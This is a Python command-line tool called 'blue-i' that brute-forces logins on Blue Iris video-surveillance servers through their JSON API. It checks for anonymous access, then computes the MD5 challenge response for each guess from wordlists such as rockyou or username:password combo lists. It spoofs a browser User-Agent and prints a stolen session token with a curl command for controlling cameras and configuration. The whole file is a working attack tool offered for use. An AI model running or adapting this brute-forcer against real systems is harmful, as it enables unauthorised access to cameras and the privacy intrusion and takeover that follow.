#!/usr/bin/env python3
import requests
import hashlib
import argparse
import sys
import time
import gzip
import os

def md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def load_wordlist(path):
    if not os.path.exists(path):
        print(f"[-] Wordlist not found: {path}")
        sys.exit(1)
    if path.endswith('.gz'):
        print(f"[+] Loading gzipped wordlist: {path}")
        with gzip.open(path, 'rt', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    else:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]

def load_combo(path):
    if not os.path.exists(path):
        print(f"[-] Combo file not found: {path}")
        sys.exit(1)
    combos = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                user, pwd = line.split(':', 1)
                combos.append((user.strip(), pwd.strip()))
    return combos

def main():
    parser = argparse.ArgumentParser(
        prog="blue-i",
        description="Blue Iris Modern JSON Scanner & Brute-Forcer (c0nfigur3/BI-scanner)",
        epilog="Example: blue-i -H http://REDACTED:81 -p /usr/share/wordlists/rockyou.txt.gz -v --delay 1"
    )
    parser.add_argument("-H", "--host", required=True, help="Target URL (e.g. http://REDACTED:81)")
    parser.add_argument("-u", "--users", default="users.txt", help="Username list (default: users.txt)")
    parser.add_argument("-p", "--passwords", default="passwords.txt", help="Password list — supports .txt or .gz")
    parser.add_argument("-c", "--combo", help="Combo list (username:password per line) — dynamic brute-force")
    parser.add_argument("--try-user-as-pass", action="store_true", help="Dynamically try each username as its own password")
    parser.add_argument("-d", "--delay", type=int, default=2, help="Delay between attempts in seconds (default: 2)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    # ... (rest of the code stays exactly the same as your current version)
    base_url = args.host.rstrip("/")
    print(f"[*] Targeting Blue Iris @ {base_url}\n")

    try:
        r = requests.post(f"{base_url}/json", json={"cmd": "login"}, timeout=10)
        data = r.json()
        if data.get("result") == "success":
            print("[+] SUCCESS! Anonymous access is permitted")
            sys.exit(0)
    except:
        pass
    print("[-] Anonymous access is not permitted")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

    if args.combo:
        print(f"[+] Dynamic combo mode — loading {args.combo}")
        combos = load_combo(args.combo)
        print(f"[+] Brute forcing {len(combos):,} username:password pairs...\n")
        for user, pwd in combos:
            if args.verbose:
                print(f"[*] Trying {user}:{pwd}")
            else:
                print(f"\r[*] Trying {user}:{pwd[:20]:20}", end="", flush=True)
            if brute_attempt(session, base_url, user, pwd, args.verbose):
                sys.exit(0)
            time.sleep(args.delay)
        print("\n[-] No luck with combo list.")
        sys.exit(1)

    try:
        with open(args.users) as f:
            users = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        users = ["admin"]
        print("[!] users.txt not found — using default 'admin'")

    passwords = load_wordlist(args.passwords)
    print(f"[+] Brute forcing {len(users)} user(s) × {len(passwords):,} password(s)...\n")

    for user in users:
        if args.try_user_as_pass:
            if args.verbose:
                print(f"[*] Trying {user}:{user}  (user-as-pass)")
            else:
                print(f"\r[*] Trying {user}:{user}  (user-as-pass)", end="", flush=True)
            if brute_attempt(session, base_url, user, user, args.verbose):
                sys.exit(0)
            time.sleep(args.delay)

        for pwd in passwords:
            if args.verbose:
                print(f"[*] Trying {user}:{pwd}")
            else:
                print(f"\r[*] Trying {user}:{pwd[:20]:20}", end="", flush=True)
            if brute_attempt(session, base_url, user, pwd, args.verbose):
                sys.exit(0)
            time.sleep(args.delay)

    print("\n[-] No luck with current wordlists.")
    sys.exit(1)

def brute_attempt(session, base_url, user, pwd, verbose):
    try:
        r = session.post(f"{base_url}/json", json={"cmd": "login"}, timeout=10)
        resp = r.json()
        if resp.get("result") != "success":
            return False
        sess_id = resp["session"]

        response_hash = md5(f"{user}:{sess_id}:{pwd}")
        payload = {"cmd": "login", "session": sess_id, "response": response_hash}
        r = session.post(f"{base_url}/json", json=payload, timeout=10)

        resp = r.json()
        if resp.get("result") == "success":
            print(f"\n\n[+] SUCCESS - {user}:{pwd}")
            print(f"    Session token: {sess_id}")
            print(f"    Use this token for any JSON command (cameras, alerts, config, etc.)")
            print(f"\n[+] Example: curl -X POST {base_url}/json -d '{{\"cmd\":\"system\",\"session\":\"{sess_id}\"}}'")
            return True
    except:
        pass
    return False

if __name__ == "__main__":
    main()
